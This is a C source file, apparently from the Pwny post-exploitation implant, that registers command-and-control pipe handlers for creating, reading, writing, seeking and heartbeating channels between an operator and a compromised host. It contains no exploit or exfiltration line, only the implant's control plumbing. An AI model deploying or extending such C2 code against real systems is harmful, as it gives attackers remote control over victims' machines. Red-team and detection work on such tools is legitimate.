/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <pwny/tlv.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>
#include <pwny/api.h>
#include <pwny/pipe.h>
#include <pwny/worker.h>

#include <uthash/uthash.h>

/*
 * Context for async pipe operations dispatched to worker threads.
 */

typedef struct
{
    worker_pool_t *pool;
    c2_t *c2;
    tlv_pkt_t *request;
    pipes_t *pipes;
    pipe_t *pipe;
    int id;
    int type;
    int length;
} pipe_async_ctx_t;

static tlv_pkt_t *pipe_create(c2_t *c2)
{
    int id;
    int flags;
    int type;

    pipe_t *pipe;
    pipes_t *pipes;
    tlv_pkt_t *result;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_FLAGS, &flags);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    pipe = calloc(1, sizeof(*pipe));

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    pipe->id = id;
    pipe->flags = flags;
    HASH_ADD_INT(pipes->pipes, id, pipe);

    if (pipes->callbacks.create_cb(pipe, c2) != 0)
    {
        log_debug("* Failed to create C2 pipe (id: %d)\n", id);

        HASH_DEL(pipes->pipes, pipe);
        free(pipe);

        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    log_debug("* Created C2 pipe (id: %d)\n", id);

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

static tlv_pkt_t *pipe_destroy(c2_t *c2)
{
    int id;
    int type;

    pipes_t *pipes;
    pipe_t *pipe;
    tlv_pkt_t *result;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    HASH_FIND_INT(pipes->pipes, &id, pipe);

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    if (pipes->callbacks.destroy_cb(pipe, c2) != 0)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    log_debug("* Destroyed C2 pipe (id: %d)\n", pipe->id);

    HASH_DEL(pipes->pipes, pipe);
    free(pipe);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

static tlv_pkt_t *pipe_heartbeat(c2_t *c2)
{
    int id;
    int type;

    tlv_pkt_t *result;
    pipes_t *pipes;
    pipe_t *pipe;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    HASH_FIND_INT(pipes->pipes, &id, pipe);

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    log_debug("* Checking C2 pipe (id: %d)\n", pipe->id);
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (pipes->callbacks.heartbeat_cb(pipe, c2) >= 0)
    {
        tlv_pkt_add_u32(result, TLV_TYPE_PIPE_HEARTBEAT, API_CALL_SUCCESS);
        goto finalize;
    }

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_HEARTBEAT, API_CALL_FAIL);
    goto finalize;

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

static tlv_pkt_t *pipe_tell(c2_t *c2)
{
    int id;
    int type;
    int offset;

    tlv_pkt_t *result;
    pipes_t *pipes;
    pipe_t *pipe;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    HASH_FIND_INT(pipes->pipes, &id, pipe);

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    log_debug("* Telling from C2 pipe (id: %d)\n", pipe->id);
    offset = pipes->callbacks.tell_cb(pipe);

    if (offset >= 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_u32(result, TLV_TYPE_PIPE_OFFSET, offset);
        goto finalize;
    }

    result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    goto finalize;

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

static tlv_pkt_t *pipe_seek(c2_t *c2)
{
    int id;
    int type;
    int offset;
    int whence;

    tlv_pkt_t *result;
    pipes_t *pipes;
    pipe_t *pipe;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    HASH_FIND_INT(pipes->pipes, &id, pipe);

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_OFFSET, &offset);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_WHENCE, &whence);

    log_debug("* Seeking from C2 pipe (id: %d)\n", pipe->id);

    if (pipes->callbacks.seek_cb(pipe, offset, whence) != 0)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    goto finalize;

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

static tlv_pkt_t *pipe_write(c2_t *c2)
{
    int id;
    int type;
    int length;
    unsigned char *buffer;

    ssize_t bytes;
    pipes_t *pipes;
    pipe_t *pipe;
    tlv_pkt_t *result;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    HASH_FIND_INT(pipes->pipes, &id, pipe);

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
    tlv_pkt_get_bytes(c2->request, TLV_TYPE_PIPE_BUFFER, &buffer);

    if (buffer == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    log_debug("* Writing to C2 pipe (id: %d)\n", pipe->id);
    bytes = pipes->callbacks.write_cb(pipe, buffer, length);
    free(buffer);

    if (bytes >= 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        goto finalize;
    }

    result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    goto finalize;

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

static void pipe_read_worker(void *arg)
{
    pipe_async_ctx_t *ctx;
    unsigned char *buffer;
    ssize_t bytes;
    tlv_pkt_t *result;

    ctx = (pipe_async_ctx_t *)arg;
    buffer = calloc(1, ctx->length);

    if (buffer == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, ctx->request);
        tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, ctx->id);
        tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, ctx->type);

        worker_push_response(ctx->pool, ctx->c2, result, ctx->request);
        free(ctx);
        return;
    }

    bytes = ctx->pipes->callbacks.read_cb(ctx->pipe, buffer, ctx->length);

    if (bytes >= 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, ctx->request);
        tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, bytes);
    }
    else
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, ctx->request);
    }

    free(buffer);

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, ctx->id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, ctx->type);

    worker_push_response(ctx->pool, ctx->c2, result, ctx->request);
    free(ctx);
}

static tlv_pkt_t *pipe_read(c2_t *c2)
{
    int id;
    int type;
    int length;

    pipes_t *pipes;
    pipe_t *pipe;
    tlv_pkt_t *result;
    tlv_pkt_t *request_clone;
    worker_pool_t *pool;
    pipe_async_ctx_t *ctx;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    HASH_FIND_INT(pipes->pipes, &id, pipe);

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_LENGTH, &length);

    /* Try async dispatch via worker pool.
     * Skip if the pipe requires thread affinity (PIPE_SYNCHRONOUS). */

    pool = (worker_pool_t *)c2->worker;

    if (pool != NULL && !(pipe->flags & PIPE_SYNCHRONOUS))
    {
        request_clone = tlv_pkt_clone(c2->request);

        if (request_clone == NULL)
        {
            goto sync_fallback;
        }

        ctx = calloc(1, sizeof(*ctx));

        if (ctx == NULL)
        {
            tlv_pkt_destroy(request_clone);
            goto sync_fallback;
        }

        ctx->pool = pool;
        ctx->c2 = c2;
        ctx->request = request_clone;
        ctx->pipes = pipes;
        ctx->pipe = pipe;
        ctx->id = id;
        ctx->type = type;
        ctx->length = length;

        if (worker_submit(pool, pipe_read_worker, ctx) == 0)
        {
            log_debug("* Async reading from C2 pipe (id: %d)\n", pipe->id);

            tlv_pkt_destroy(c2->request);
            c2->request = NULL;
            return NULL;
        }

        /* Submit failed — clean up and fall through to sync */
        tlv_pkt_destroy(request_clone);
        free(ctx);
    }

sync_fallback:
    {
        unsigned char *buffer;
        ssize_t bytes;

        buffer = calloc(1, length);

        if (buffer == NULL)
        {
            result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            goto finalize;
        }

        log_debug("* Reading from C2 pipe (id: %d)\n", pipe->id);
        bytes = pipes->callbacks.read_cb(pipe, buffer, length);

        if (bytes >= 0)
        {
            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
            tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, bytes);
        }
        else
        {
            result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }

        free(buffer);
    }

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

static void pipe_readall_worker(void *arg)
{
    pipe_async_ctx_t *ctx;
    void *buffer;
    ssize_t bytes;
    tlv_pkt_t *result;

    ctx = (pipe_async_ctx_t *)arg;
    bytes = ctx->pipes->callbacks.readall_cb(ctx->pipe, &buffer);

    if (bytes >= 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, ctx->request);
        tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER,
                          (unsigned char *)buffer, bytes);
        free(buffer);
    }
    else
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, ctx->request);
    }

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, ctx->id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, ctx->type);

    worker_push_response(ctx->pool, ctx->c2, result, ctx->request);
    free(ctx);
}

static tlv_pkt_t *pipe_readall(c2_t *c2)
{
    int id;
    int type;

    pipes_t *pipes;
    pipe_t *pipe;
    tlv_pkt_t *result;
    tlv_pkt_t *request_clone;
    worker_pool_t *pool;
    pipe_async_ctx_t *ctx;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_TYPE, &type);

    HASH_FIND_INT(c2->pipes, &type, pipes);

    if (pipes == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    HASH_FIND_INT(pipes->pipes, &id, pipe);

    if (pipe == NULL)
    {
        result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        goto finalize;
    }

    /* Try async dispatch via worker pool.
     * Skip if the pipe requires thread affinity (PIPE_SYNCHRONOUS). */

    pool = (worker_pool_t *)c2->worker;

    if (pool != NULL && !(pipe->flags & PIPE_SYNCHRONOUS))
    {
        request_clone = tlv_pkt_clone(c2->request);

        if (request_clone == NULL)
        {
            goto sync_fallback;
        }

        ctx = calloc(1, sizeof(*ctx));

        if (ctx == NULL)
        {
            tlv_pkt_destroy(request_clone);
            goto sync_fallback;
        }

        ctx->pool = pool;
        ctx->c2 = c2;
        ctx->request = request_clone;
        ctx->pipes = pipes;
        ctx->pipe = pipe;
        ctx->id = id;
        ctx->type = type;
        ctx->length = 0;

        if (worker_submit(pool, pipe_readall_worker, ctx) == 0)
        {
            log_debug("* Async reading all from C2 pipe (id: %d)\n", pipe->id);

            tlv_pkt_destroy(c2->request);
            c2->request = NULL;
            return NULL;
        }

        /* Submit failed — clean up and fall through to sync */
        tlv_pkt_destroy(request_clone);
        free(ctx);
    }

sync_fallback:
    {
        void *buffer;
        ssize_t bytes;

        log_debug("* Reading from C2 pipe (id: %d)\n", pipe->id);
        bytes = pipes->callbacks.readall_cb(pipe, &buffer);

        if (bytes >= 0)
        {
            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
            tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER,
                              (unsigned char *)buffer, bytes);
            free(buffer);
        }
        else
        {
            result = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }
    }

finalize:
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, type);

    return result;
}

void register_pipe_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, PIPE_READ, pipe_read);
    api_call_register(api_calls, PIPE_READALL, pipe_readall);
    api_call_register(api_calls, PIPE_WRITE, pipe_write);
    api_call_register(api_calls, PIPE_SEEK, pipe_seek);
    api_call_register(api_calls, PIPE_TELL, pipe_tell);
    api_call_register(api_calls, PIPE_HEARTBEAT, pipe_heartbeat);
    api_call_register(api_calls, PIPE_CREATE, pipe_create);
    api_call_register(api_calls, PIPE_DESTROY, pipe_destroy);
}